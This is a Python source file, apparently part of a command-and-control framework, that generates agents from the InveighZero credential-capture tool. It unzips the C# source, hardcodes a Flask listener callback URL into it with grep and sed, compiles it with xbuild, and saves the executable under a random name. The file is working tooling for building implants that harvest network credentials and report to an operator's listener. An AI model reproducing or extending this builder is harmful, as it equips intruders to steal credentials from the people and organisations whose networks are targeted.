import os
from subprocess import Popen, PIPE
import string
import random
import zipfile
import shutil


# TODO: Listener name generation matches Agent name generation

# TODO: Integrate crypto key gen into Agent gen. Agent can only send data if it has the correct public key. Priv key
#  is generated for each listener

def create_agent(ip, port, inveigh):
    # FORMAT URL FOR FLASK LISTENER
    url = "http://{0}:{1}/listener".format(ip, port)
    # CD TO UNZIPPED CODE DIR
    os.chdir(inveigh)
    # UNZIP INVEIGH
    with zipfile.ZipFile("InveighZero-master.zip", "r") as zip_ref:
        zip_ref.extractall("Inveigh")
    agentInveighDir = "Inveigh"

    # HARDCODE URL IN C# CODE
    os.chdir(agentInveighDir)
    cmd1 = "grep -rl FLASKURL"
    p1 = Popen(cmd1.split(), stdout=PIPE)
    cmd2 = "xargs sed -i s|FLASKURL|\"{0}\"|g".format(url)
    p2 = Popen(cmd2.split(), stdin=p1.stdout, stdout=PIPE)
    p2.communicate()

    # TODO: xbuild is apparently deprecated or soon to be, look into msbuild for this line. Also check dependencies
    #  for msbuild.

    #  COMPILE WITH MONO (REQUIRES PACKAGE MONO-COMPLETE TO BE INSTALLED)
    cmd = "xbuild /p:Configuration=Release /home/app/web/project/app/static/Inveigh/Inveigh.sln"
    p = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
    p.communicate()


def agentNameGenerator(size):
    lower = string.ascii_lowercase
    upper = string.ascii_uppercase
    digits = string.digits
    agentName = (''.join(random.choice(lower + upper + digits) for i in range(size)))
    print(agentName)
    return agentName


def moveAndRename(agentName):
    shutil.move("/home/app/web/project/app/static/Inveigh/Inveigh/bin/Release/Inveigh.exe",
                "/home/app/web/project/app/agents/{0}.exe".format(agentName))
    shutil.rmtree('/home/app/web/project/app/static/Inveigh')
